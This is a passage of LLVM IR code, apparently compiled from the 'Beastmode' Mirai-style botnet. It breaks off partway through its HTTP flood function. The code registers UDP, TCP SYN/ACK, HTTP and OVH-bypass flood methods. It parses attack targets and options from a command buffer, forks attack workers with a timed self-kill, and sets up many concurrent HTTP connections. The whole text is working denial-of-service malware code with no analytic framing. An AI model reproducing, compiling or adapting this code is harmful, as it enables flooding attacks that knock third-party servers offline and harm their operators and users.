; ModuleID = 'host/ir_O3/Beastmode.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }

@methods_len = local_unnamed_addr global i8 0, align 1
@methods = local_unnamed_addr global %struct.attack_method** null, align 8
@attack_ongoing = local_unnamed_addr global [3 x i32] zeroinitializer, align 4
@LOCAL_ADDR = common local_unnamed_addr global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@table = common local_unnamed_addr global [126 x %struct.table_value] zeroinitializer, align 16
@table_key = local_unnamed_addr global i32 -559038737, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() local_unnamed_addr #0 {
  tail call fastcc void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_vse)
  tail call fastcc void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_plain)
  tail call fastcc void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_tcp_syn)
  tail call fastcc void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_tcp_ack)
  tail call fastcc void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_app_http)
  tail call fastcc void @add_attack(i8 zeroext 11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_stdhex)
  tail call fastcc void @add_attack(i8 zeroext 12, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_ovhhex)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) unnamed_addr #0 {
  %3 = tail call noalias i8* @calloc(i64 1, i64 16) #10
  %4 = getelementptr inbounds i8, i8* %3, i64 8
  store i8 %0, i8* %4, align 8
  %5 = bitcast i8* %3 to void (i8, %struct.attack_target*, i8, %struct.attack_option*)**
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %5, align 8
  %6 = load i8*, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %7 = load i8, i8* @methods_len, align 1
  %8 = zext i8 %7 to i64
  %9 = shl nuw nsw i64 %8, 3
  %10 = add nuw nsw i64 %9, 8
  %11 = tail call i8* @realloc(i8* %6, i64 %10) #10
  %12 = bitcast i8* %11 to %struct.attack_method**
  store i8* %11, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %13 = load i8, i8* @methods_len, align 1
  %14 = add i8 %13, 1
  store i8 %14, i8* @methods_len, align 1
  %15 = zext i8 %13 to i64
  %16 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %12, i64 %15
  %17 = bitcast %struct.attack_method** %16 to i8**
  store i8* %3, i8** %17, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) local_unnamed_addr #1

; Function Attrs: nounwind
declare noalias i8* @realloc(i8* nocapture, i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() local_unnamed_addr #0 {
  %1 = load i32, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 0), align 4
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %0
  %4 = tail call i32 @kill(i32 %1, i32 9) #10
  br label %5

; <label>:5:                                      ; preds = %0, %3
  store i32 0, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 0), align 4
  %6 = load i32, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 1), align 4
  %7 = icmp eq i32 %6, 0
  br i1 %7, label %10, label %8

; <label>:8:                                      ; preds = %5
  %9 = tail call i32 @kill(i32 %6, i32 9) #10
  br label %10

; <label>:10:                                     ; preds = %8, %5
  store i32 0, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 1), align 4
  %11 = load i32, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 2), align 4
  %12 = icmp eq i32 %11, 0
  br i1 %12, label %15, label %13

; <label>:13:                                     ; preds = %10
  %14 = tail call i32 @kill(i32 %11, i32 9) #10
  br label %15

; <label>:15:                                     ; preds = %13, %10
  store i32 0, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 2), align 4
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8* nocapture readonly, i32) local_unnamed_addr #0 {
  %3 = icmp ult i32 %1, 4
  br i1 %3, label %.thread80, label %4

; <label>:4:                                      ; preds = %2
  %5 = bitcast i8* %0 to i32*
  %6 = load i32, i32* %5, align 4
  %7 = tail call i32 @ntohl(i32 %6) #11
  %8 = icmp eq i32 %1, 4
  br i1 %8, label %.thread80, label %9

; <label>:9:                                      ; preds = %4
  %10 = getelementptr inbounds i8, i8* %0, i64 4
  %11 = load i8, i8* %10, align 1
  %12 = icmp eq i32 %1, 5
  br i1 %12, label %.thread80, label %13

; <label>:13:                                     ; preds = %9
  %14 = getelementptr inbounds i8, i8* %0, i64 5
  %15 = getelementptr inbounds i8, i8* %0, i64 6
  %16 = load i8, i8* %14, align 1
  %17 = add i32 %1, -6
  %18 = zext i8 %16 to i32
  %19 = icmp eq i8 %16, 0
  br i1 %19, label %.thread80, label %20

; <label>:20:                                     ; preds = %13
  %21 = sext i32 %17 to i64
  %22 = zext i8 %16 to i64
  %23 = mul nuw nsw i64 %22, 5
  %24 = icmp ult i64 %21, %23
  br i1 %24, label %.thread80, label %.lr.ph88.preheader

.lr.ph88.preheader:                               ; preds = %20
  %25 = tail call noalias i8* @calloc(i64 %22, i64 24) #10
  %26 = bitcast i8* %25 to %struct.attack_target*
  %27 = add nsw i32 %18, -1
  %28 = zext i32 %27 to i64
  %29 = mul nuw nsw i64 %28, 5
  %30 = add nuw nsw i64 %29, 11
  %scevgep = getelementptr i8, i8* %0, i64 %30
  %wide.trip.count = zext i8 %16 to i64
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph88.prol.loopexit, label %.lr.ph88.prol.preheader

.lr.ph88.prol.preheader:                          ; preds = %.lr.ph88.preheader
  br label %.lr.ph88.prol

.lr.ph88.prol:                                    ; preds = %.lr.ph88.prol.preheader
  %31 = bitcast i8* %15 to i32*
  %32 = load i32, i32* %31, align 4
  %33 = getelementptr inbounds i8, i8* %25, i64 16
  %34 = bitcast i8* %33 to i32*
  store i32 %32, i32* %34, align 4
  %35 = getelementptr inbounds i8, i8* %0, i64 10
  %36 = getelementptr inbounds i8, i8* %0, i64 11
  %37 = load i8, i8* %35, align 1
  %38 = getelementptr inbounds i8, i8* %25, i64 20
  store i8 %37, i8* %38, align 4
  %39 = bitcast i8* %25 to i16*
  store i16 2, i16* %39, align 4
  %40 = getelementptr inbounds i8, i8* %25, i64 4
  %41 = bitcast i8* %40 to i32*
  store i32 %32, i32* %41, align 4
  br label %.lr.ph88.prol.loopexit

.lr.ph88.prol.loopexit:                           ; preds = %.lr.ph88.preheader, %.lr.ph88.prol
  %indvars.iv91.unr = phi i64 [ 0, %.lr.ph88.preheader ], [ 1, %.lr.ph88.prol ]
  %.087.unr = phi i8* [ %15, %.lr.ph88.preheader ], [ %36, %.lr.ph88.prol ]
  %42 = icmp eq i8 %16, 1
  br i1 %42, label %._crit_edge, label %.lr.ph88.preheader.new

.lr.ph88.preheader.new:                           ; preds = %.lr.ph88.prol.loopexit
  br label %.lr.ph88

.lr.ph88:                                         ; preds = %.lr.ph88, %.lr.ph88.preheader.new
  %indvars.iv91 = phi i64 [ %indvars.iv91.unr, %.lr.ph88.preheader.new ], [ %indvars.iv.next92.1, %.lr.ph88 ]
  %.087 = phi i8* [ %.087.unr, %.lr.ph88.preheader.new ], [ %56, %.lr.ph88 ]
  %43 = bitcast i8* %.087 to i32*
  %44 = load i32, i32* %43, align 4
  %45 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 1
  store i32 %44, i32* %45, align 4
  %46 = getelementptr inbounds i8, i8* %.087, i64 4
  %47 = getelementptr inbounds i8, i8* %.087, i64 5
  %48 = load i8, i8* %46, align 1
  %49 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 2
  store i8 %48, i8* %49, align 4
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 0
  store i16 2, i16* %50, align 4
  %51 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 2, i32 0
  store i32 %44, i32* %51, align 4
  %indvars.iv.next92 = add nuw nsw i64 %indvars.iv91, 1
  %52 = bitcast i8* %47 to i32*
  %53 = load i32, i32* %52, align 4
  %54 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 1
  store i32 %53, i32* %54, align 4
  %55 = getelementptr inbounds i8, i8* %.087, i64 9
  %56 = getelementptr inbounds i8, i8* %.087, i64 10
  %57 = load i8, i8* %55, align 1
  %58 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 2
  store i8 %57, i8* %58, align 4
  %59 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 0
  store i16 2, i16* %59, align 4
  %60 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 2, i32 0
  store i32 %53, i32* %60, align 4
  %indvars.iv.next92.1 = add nsw i64 %indvars.iv91, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next92.1, %wide.trip.count
  br i1 %exitcond.1, label %._crit_edge.unr-lcssa, label %.lr.ph88

._crit_edge.unr-lcssa:                            ; preds = %.lr.ph88
  br label %._crit_edge

._crit_edge:                                      ; preds = %.lr.ph88.prol.loopexit, %._crit_edge.unr-lcssa
  %61 = mul nsw i32 %18, -5
  %62 = add i32 %17, %61
  %63 = icmp eq i32 %62, 0
  br i1 %63, label %.loopexit81.thread, label %64

; <label>:64:                                     ; preds = %._crit_edge
  %65 = load i8, i8* %scevgep, align 1
  %66 = icmp eq i8 %65, 0
  br i1 %66, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %64
  %67 = zext i8 %65 to i64
  %68 = tail call noalias i8* @calloc(i64 %67, i64 16) #10
  %69 = bitcast i8* %68 to %struct.attack_option*
  %70 = getelementptr inbounds i8, i8* %scevgep, i64 1
  %71 = add i32 %62, -1
  %72 = zext i8 %65 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %85
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %85 ]
  %.184 = phi i8* [ %70, %.lr.ph.preheader ], [ %91, %85 ]
  %.17583 = phi i32 [ %71, %.lr.ph.preheader ], [ %92, %85 ]
  %73 = icmp eq i32 %.17583, 0
  br i1 %73, label %.loopexit81.loopexit, label %74

; <label>:74:                                     ; preds = %.lr.ph
  %75 = load i8, i8* %.184, align 1
  %76 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %69, i64 %indvars.iv, i32 1
  store i8 %75, i8* %76, align 8
  %77 = icmp eq i32 %.17583, 1
  br i1 %77, label %.loopexit81.loopexit, label %78

; <label>:78:                                     ; preds = %74
  %79 = getelementptr inbounds i8, i8* %.184, i64 1
  %80 = getelementptr inbounds i8, i8* %.184, i64 2
  %81 = load i8, i8* %79, align 1
  %82 = add i32 %.17583, -2
  %83 = zext i8 %81 to i32
  %84 = icmp slt i32 %82, %83
  br i1 %84, label %.loopexit81.loopexit, label %85

; <label>:85:                                     ; preds = %78
  %86 = add nuw nsw i32 %83, 1
  %87 = zext i32 %86 to i64
  %88 = tail call noalias i8* @calloc(i64 %87, i64 1) #10
  %89 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %69, i64 %indvars.iv, i32 0
  store i8* %88, i8** %89, align 8
  tail call void @util_memcpy(i8* %88, i8* %80, i32 %83)
  %90 = zext i8 %81 to i64
  %91 = getelementptr inbounds i8, i8* %80, i64 %90
  %92 = sub nsw i32 %82, %83
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %93 = icmp slt i64 %indvars.iv.next, %72
  br i1 %93, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %85
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %64
  %.070 = phi %struct.attack_option* [ null, %64 ], [ %69, %.loopexit.loopexit ]
  %94 = tail call i32* @__errno_location() #11
  store i32 0, i32* %94, align 4
  tail call void @attack_start(i32 %7, i8 zeroext %11, i8 zeroext %16, %struct.attack_target* %26, i8 zeroext %65, %struct.attack_option* %.070)
  br label %.loopexit81

.loopexit81.loopexit:                             ; preds = %.lr.ph, %74, %78
  br label %.loopexit81

.loopexit81:                                      ; preds = %.loopexit81.loopexit, %.loopexit
  %.171 = phi %struct.attack_option* [ %.070, %.loopexit ], [ %69, %.loopexit81.loopexit ]
  %95 = icmp eq i8* %25, null
  br i1 %95, label %96, label %.loopexit81.thread

.loopexit81.thread:                               ; preds = %._crit_edge, %.loopexit81
  %.17195 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ null, %._crit_edge ]
  %.07393 = phi i8 [ %65, %.loopexit81 ], [ undef, %._crit_edge ]
  tail call void @free(i8* nonnull %25) #10
  br label %96

; <label>:96:                                     ; preds = %.loopexit81, %.loopexit81.thread
  %.17196 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ %.17195, %.loopexit81.thread ]
  %.07394 = phi i8 [ %65, %.loopexit81 ], [ %.07393, %.loopexit81.thread ]
  %97 = icmp eq %struct.attack_option* %.17196, null
  br i1 %97, label %.thread80, label %98

; <label>:98:                                     ; preds = %96
  %99 = zext i8 %.07394 to i32
  tail call fastcc void @free_opts(%struct.attack_option* nonnull %.17196, i32 %99)
  br label %.thread80

.thread80:                                        ; preds = %2, %4, %9, %13, %20, %96, %98
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) local_unnamed_addr #0 {
  %7 = tail call i32 @fork() #10
  %8 = icmp eq i32 %7, -1
  %9 = icmp sgt i32 %7, 0
  %or.cond = or i1 %8, %9
  br i1 %or.cond, label %10, label %11

; <label>:10:                                     ; preds = %6
  ret void

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @fork() #10
  switch i32 %12, label %.preheader [
    i32 -1, label %17
    i32 0, label %18
  ]

.preheader:                                       ; preds = %11
  %13 = load i8, i8* @methods_len, align 1
  %14 = icmp eq i8 %13, 0
  br i1 %14, label %.loopexit, label %.lr.ph

.lr.ph:                                           ; preds = %.preheader
  %15 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %16 = zext i8 %13 to i64
  br label %24

; <label>:17:                                     ; preds = %11
  tail call void @exit(i32 0) #12
  unreachable

; <label>:18:                                     ; preds = %11
  %19 = tail call i32 @sleep(i32 %0) #10
  %20 = tail call i32 @getppid() #10
  %21 = tail call i32 @kill(i32 %20, i32 9) #10
  tail call void @exit(i32 0) #12
  unreachable

; <label>:22:                                     ; preds = %24
  %23 = icmp slt i64 %indvars.iv.next, %16
  br i1 %23, label %24, label %.loopexit.loopexit

; <label>:24:                                     ; preds = %.lr.ph, %22
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %22 ]
  %25 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %15, i64 %indvars.iv
  %26 = load %struct.attack_method*, %struct.attack_method** %25, align 8
  %27 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %26, i64 0, i32 1
  %28 = load i8, i8* %27, align 8
  %29 = icmp eq i8 %28, %1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %29, label %30, label %22

; <label>:30:                                     ; preds = %24
  %31 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %26, i64 0, i32 0
  %32 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %31, align 8
  tail call void %32(i8 zeroext %2, %struct.attack_target* %3, i8 zeroext %4, %struct.attack_option* %5) #10
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %22
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %30
  tail call void @exit(i32 0) #12
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @free_opts(%struct.attack_option*, i32) unnamed_addr #0 {
  %3 = icmp eq %struct.attack_option* %0, null
  br i1 %3, label %11, label %.preheader

.preheader:                                       ; preds = %2
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %9
  %indvars.iv = phi i64 [ %indvars.iv.next, %9 ], [ 0, %.lr.ph.preheader ]
  %5 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %0, i64 %indvars.iv, i32 0
  %6 = load i8*, i8** %5, align 8
  %7 = icmp eq i8* %6, null
  br i1 %7, label %9, label %8

; <label>:8:                                      ; preds = %.lr.ph
  tail call void @free(i8* nonnull %6) #10
  br label %9

; <label>:9:                                      ; preds = %.lr.ph, %8
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %9
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %10 = bitcast %struct.attack_option* %0 to i8*
  tail call void @free(i8* %10) #10
  br label %11

; <label>:11:                                     ; preds = %2, %._crit_edge
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #3

declare i32 @sleep(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @getppid() local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i8* readnone) local_unnamed_addr #5 {
  %5 = icmp eq i8 %0, 0
  br i1 %5, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %4
  %6 = zext i8 %0 to i64
  br label %.lr.ph

; <label>:7:                                      ; preds = %.lr.ph
  %8 = icmp slt i64 %indvars.iv.next, %6
  br i1 %8, label %.lr.ph, label %.loopexit.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %7
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %7 ]
  %9 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 1
  %10 = load i8, i8* %9, align 8
  %11 = icmp eq i8 %10, %2
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %11, label %12, label %7

; <label>:12:                                     ; preds = %.lr.ph
  %13 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 0
  %14 = load i8*, i8** %13, align 8
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %7
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4, %12
  %.09 = phi i8* [ %14, %12 ], [ %3, %4 ], [ %3, %.loopexit.loopexit ]
  ret i8* %.09
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #5 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @util_atoi(i8* nonnull %5, i32 10)
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #0 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @inet_addr(i8* nonnull %5) #10
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_app_http(i8 zeroext, %struct.attack_target* nocapture readonly, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca [10241 x i8], align 16
  %7 = alloca %struct.fd_set, align 8
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %9 to %struct.timeval*
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca [10240 x i8], align 16
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 21, i8* null)
  %15 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 20, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  %16 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 8, i8* null)
  %17 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 22, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 24, i32 1)
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 80)
  %20 = trunc i32 %19 to i16
  %21 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %21, i8 0, i64 10241, i32 16, i1 false)
  %22 = icmp eq i8* %16, null
  %23 = icmp eq i8* %17, null
  %or.cond = or i1 %22, %23
  br i1 %or.cond, label %973, label %24

; <label>:24:                                     ; preds = %4
  %25 = tail call i32 @util_strlen(i8* %17)
  %26 = icmp sgt i32 %25, 255
  br i1 %26, label %973, label %27

; <label>:27:                                     ; preds = %24
  %28 = tail call i32 @util_strlen(i8* %16)
  %29 = icmp sgt i32 %28, 127
  br i1 %29, label %973, label %30

; <label>:30:                                     ; preds = %27
  %31 = tail call i32 @util_strlen(i8* %15)
  %32 = icmp sgt i32 %31, 9
  br i1 %32, label %973, label %.preheader623

.preheader623:                                    ; preds = %30
  store i32 0, i32* %5, align 4
  %33 = icmp sgt i32 %31, 0
  br i1 %33, label %.lr.ph669.preheader, label %._crit_edge670

.lr.ph669.preheader:                              ; preds = %.preheader623
  br label %.lr.ph669

.lr.ph669:                                        ; preds = %.lr.ph669.preheader, %40
  %storemerge668 = phi i32 [ %42, %40 ], [ 0, %.lr.ph669.preheader ]
  %34 = sext i32 %storemerge668 to i64
  %35 = getelementptr inbounds i8, i8* %15, i64 %34
  %36 = load i8, i8* %35, align 1
  %.off612 = add i8 %36, -97
  %37 = icmp ult i8 %.off612, 26
  br i1 %37, label %38, label %40

; <label>:38:                                     ; preds = %.lr.ph669
  %39 = add i8 %36, -32
  store i8 %39, i8* %35, align 1
  %.pre = load i32, i32* %5, align 4
  br label %40

; <label>:40:                                     ; preds = %.lr.ph669, %38
  %41 = phi i32 [ %storemerge668, %.lr.ph669 ], [ %.pre, %38 ]
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %5, align 4
  %43 = tail call i32 @util_strlen(i8* nonnull %15)
  %44 = icmp slt i32 %42, %43
  br i1 %44, label %.lr.ph669, label %._crit_edge670.loopexit

._crit_edge670.loopexit:                          ; preds = %40
  br label %._crit_edge670

._crit_edge670:                                   ; preds = %._crit_edge670.loopexit, %.preheader623
  %45 = icmp slt i32 %18, 500
  %. = select i1 %45, i32 %18, i32 500
  tail call void @table_unlock_val(i8 zeroext 61)
  tail call void @table_unlock_val(i8 zeroext 62)
  tail call void @table_unlock_val(i8 zeroext 63)
  tail call void @table_unlock_val(i8 zeroext 64)
  tail call void @table_unlock_val(i8 zeroext 65)
  tail call void @table_unlock_val(i8 zeroext 66)
  tail call void @table_unlock_val(i8 zeroext 67)
  tail call void @table_unlock_val(i8 zeroext 68)
  tail call void @table_unlock_val(i8 zeroext 69)
  tail call void @table_unlock_val(i8 zeroext 70)
  tail call void @table_unlock_val(i8 zeroext 71)
  %46 = sext i32 %. to i64
  %47 = tail call noalias i8* @calloc(i64 %46, i64 3140) #10
  %48 = bitcast i8* %47 to %struct.attack_http_state*
  %49 = icmp sgt i32 %18, 0
  br i1 %49, label %.lr.ph667, label %.preheader621

.lr.ph667:                                        ; preds = %._crit_edge670
  %50 = zext i8 %0 to i32
  br label %62

.preheader621.loopexit:                           ; preds = %93
  br label %.preheader621

.preheader621:                                    ; preds = %.preheader621.loopexit, %._crit_edge670
  %51 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 0
  %52 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 0
  %53 = bitcast %struct.sockaddr_in* %10 to i8*
  %54 = bitcast i32* %5 to i8*
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i64 0, i32 0
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i64 0, i32 2, i32 0
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i64 0, i32 1
  %58 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %59 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 0
  %60 = icmp ne i8* %14, null
  %61 = bitcast i32* %12 to i8*
  %.not = icmp slt i32 %18, 1
  br label %.backedge622

; <label>:62:                                     ; preds = %.lr.ph667, %93
  %indvars.iv698 = phi i64 [ 0, %.lr.ph667 ], [ %indvars.iv.next699, %93 ]
  %63 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv698, i32 1
  store i8 0, i8* %63, align 4
  %64 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv698, i32 0
  store i32 -1, i32* %64, align 4
  %65 = trunc i64 %indvars.iv698 to i32
  %66 = srem i32 %65, %50
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %67, i32 1
  %69 = load i32, i32* %68, align 4
